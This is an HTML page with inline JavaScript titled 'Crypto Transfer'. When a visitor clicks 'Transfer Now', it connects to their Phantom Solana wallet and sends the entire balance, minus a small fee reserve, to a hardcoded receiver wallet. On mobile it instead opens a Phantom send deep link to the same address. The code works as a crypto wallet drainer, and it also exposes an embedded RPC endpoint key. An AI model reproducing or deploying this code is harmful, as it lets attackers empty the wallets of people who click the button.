<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Transfer</title>
</head>
<body>
    <h2>Click below to transfer all funds</h2>
    <button id="transferButton">Transfer Now</button>

    <script>
        document.getElementById('transferButton').addEventListener('click', async () => {
            const receiverWallet = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";

            function isMobileDevice() {
                return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            }

            if (isMobileDevice()) {
                // Open Phantom mobile app using deep link
                const mobileLink = `https://phantom.app/ul/v1/send?recipient=${receiverWallet}`;
                window.location.href = mobileLink;
            } else {
                // Open Phantom desktop browser extension
                if (!window.solana) {
                    alert("Phantom wallet not found. Please install the extension.");
                    return;
                }
                
                try {
                    await window.solana.connect();
                    const provider = window.solana;

                    // Connect to Solana blockchain using QuickNode RPC
                    const connection = new solanaWeb3.Connection(
                        "https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df",
                        'confirmed'
                    );

                    const publicKey = provider.publicKey;
                    const balance = await connection.getBalance(publicKey);

                    if (balance === 0) {
                        alert("Insufficient balance.");
                        return;
                    }

                    const transaction = new solanaWeb3.Transaction().add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: publicKey,
                            toPubkey: new solanaWeb3.PublicKey(receiverWallet),
                            lamports: balance - 5000, // Send all SOL, leaving small balance for fees
                        })
                    );

                    const signature = await provider.signAndSendTransaction(transaction);
                    alert("Transaction sent with signature: " + signature.signature);

                    await connection.confirmTransaction(signature.signature);
                    alert("Transaction confirmed!");
                } catch (error) {
                    console.error("Error during transfer:", error);
                    alert("Error: " + error.message);
                }
            }
        });
    </script>

    <script src="https://unpkg.com/@solana/web3.js@1.75.0/lib/index.iife.min.js"></script>
</body>
</html>
